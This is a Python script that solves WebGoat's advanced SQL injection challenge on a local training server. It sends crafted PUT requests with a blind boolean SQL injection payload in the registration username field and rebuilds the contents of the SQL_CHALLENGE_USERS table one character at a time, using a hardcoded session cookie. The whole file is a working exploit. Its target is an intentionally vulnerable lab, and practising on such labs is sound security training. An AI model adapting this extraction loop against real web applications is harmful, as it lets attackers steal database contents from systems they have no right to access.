#!/usr/bin/python3

import requests,string

charset = string.printable + string.digits + string.punctuation + string.ascii_letters

url = "http://localhost:8081/WebGoat/SqlInjectionAdvanced/challenge"
cookies = {
        "JSESSIONID": "_3kSN8gfrbmfOUp-f-E7pQjvWfc4LOyGAQTUDAMf"
        }
headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
result = ""
i = 0
while True:
	i += 1
	for c in charset:
		payload = "username_reg=tom' AND substring((SELECT group_concat(USERID) FROM SQL_CHALLENGE_USERS)," + str(i) + ",1) = '" + c + "';-- &email_reg=tom%40tom.com&password_reg=tom1234&confirm_password_reg=tom1234"
		r = requests.put(url, headers=headers, cookies=cookies, data=payload)
		if "already" in r.text:
			result += c
			c = ""
			break
	if c:
		break
	print(result)
